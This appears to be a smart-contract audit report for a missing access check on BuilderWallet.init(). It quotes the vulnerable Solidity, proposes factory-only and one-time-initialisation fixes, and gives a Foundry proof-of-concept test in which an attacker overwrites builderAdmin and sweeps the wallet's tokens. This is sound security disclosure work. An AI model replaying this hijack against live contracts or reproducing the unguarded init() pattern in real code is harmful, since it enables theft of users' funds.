  "body": "## Finding description and impact\n\nThe `BuilderWallet.sol` contract contains a critical access control vulnerability in the `init()` function that allows any address to overwrite the `builderAdmin` at any time. The core issue is that the `init()` function lacks any permission checks, making it publicly callable by anyone.\n\nAccording to the contract design, `BuilderWallet` is deployed by `BuilderFactory` to manage fee distribution for builders. The `init()` function is intended to set the `builderAdmin` address, which has exclusive permission to call `sweep()` and withdraw tokens from the wallet. However, the implementation allows any address to call `init()` and overwrite the legitimate `builderAdmin`.\n\n**Vulnerable implementation:**\n```solidity\n// Inside BuilderWallet contract\nfunction init(address _builderAdmin) external {\n    builderAdmin = _builderAdmin;  // No access control check\n}\n```\n\n**Impact on sweep() function:**\n```solidity\nfunction sweep(address token, address to) external {\n    if (msg.sender != builderAdmin) revert Errors.NotBuilder();\n    // ... transfer logic\n}\n```\n\nThe vulnerability could lead to:\n- Direct theft of builder fees by attackers\n- Loss of funds for legitimate builders\n\n\n## Recommended mitigation steps\n\n**Add access control to the `init()` function in `BuilderWallet.sol`**:\n\nThere are several approaches to fix this vulnerability:\n\n**Option 1: Restrict `init()` to Factory only (Recommended)**\n```solidity\nfunction init(address _builderAdmin) external {\n    if (msg.sender != FACTORY) revert Errors.NotFactory();\n    if (builderAdmin != address(0)) revert Errors.AlreadyInitialized();\n    builderAdmin = _builderAdmin;\n}\n```\n\n**Option 2: Make `init()` callable only once**\n```solidity\nbool private initialized;\n\nfunction init(address _builderAdmin) external {\n    if (initialized) revert Errors.AlreadyInitialized();\n    if (msg.sender != FACTORY) revert Errors.NotFactory();\n    builderAdmin = _builderAdmin;\n    initialized = true;\n}\n```",
  "proof_of_concept": "```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.24;\n\nimport \"forge-std/Test.sol\";\nimport {BuilderWallet, BuilderFactory} from \"@contracts/RiskEngine.sol\";\nimport {Errors} from \"@libraries/Errors.sol\";\nimport {ERC20S} from \"./testUtils/ERC20S.sol\";\n\n/**\n * @title H-1: BuilderWallet.init() Missing Access Control Vulnerability Test\n * @notice Verifies that an attacker can call init() at any time to overwrite builderAdmin and steal fees\n */\ncontract H1Test is Test {\n    BuilderFactory factory;\n    ERC20S token;\n    \n    address owner = address(0x1);\n    address legitimateBuilder = address(0x2);\n    address attacker = address(0x3);\n    \n    uint48 builderCode = 12345;\n    address wallet;\n    \n    function setUp() public {\n        vm.prank(owner);\n        factory = new BuilderFactory(owner);\n        \n        token = new ERC20S(\"Test Token\", \"TEST\", 18);\n        token.mint(address(this), 1000e18);\n    }\n    \n    /**\n     * @notice Test vulnerability: Attacker can call init() at any time to overwrite legitimate builderAdmin\n     */\n    function test_AttackerCanHijackBuilderWallet() public {\n        // Step 1: Owner deploys BuilderWallet through Factory (normal flow)\n        vm.prank(owner);\n        wallet = factory.deployBuilder(builderCode, legitimateBuilder);\n        \n        // Verify legitimate builderAdmin is set\n        assertEq(BuilderWallet(wallet).builderAdmin(), legitimateBuilder);\n        \n        // Step 2: Send fees to BuilderWallet (simulating protocol-allocated fees)\n        token.transfer(wallet, 100e18);\n        assertEq(token.balanceOf(wallet), 100e18);\n        \n        // Step 3: Attacker can call init() at any time to overwrite builderAdmin\n        vm.prank(attacker);\n        BuilderWallet(wallet).init(attacker);\n        \n        // Verify builderAdmin has been overwritten by attacker\n        assertEq(BuilderWallet(wallet).builderAdmin(), attacker);\n        assertNotEq(BuilderWallet(wallet).builderAdmin(), legitimateBuilder);\n        \n        // Step 4: Attacker immediately withdraws funds\n        vm.prank(attacker);\n        BuilderWallet(wallet).sweep(address(token), attacker);\n        \n        // Verify attacker successfully withdrew funds\n        assertEq(token.balanceOf(attacker), 100e18);\n        assertEq(token.balanceOf(wallet), 0);\n        \n        // Step 5: Legitimate builderAdmin cannot withdraw funds (overwritten)\n        vm.prank(legitimateBuilder);\n        vm.expectRevert(Errors.NotBuilder.selector);\n        BuilderWallet(wallet).sweep(address(token), legitimateBuilder);\n    }\n    \n}\n\n```",
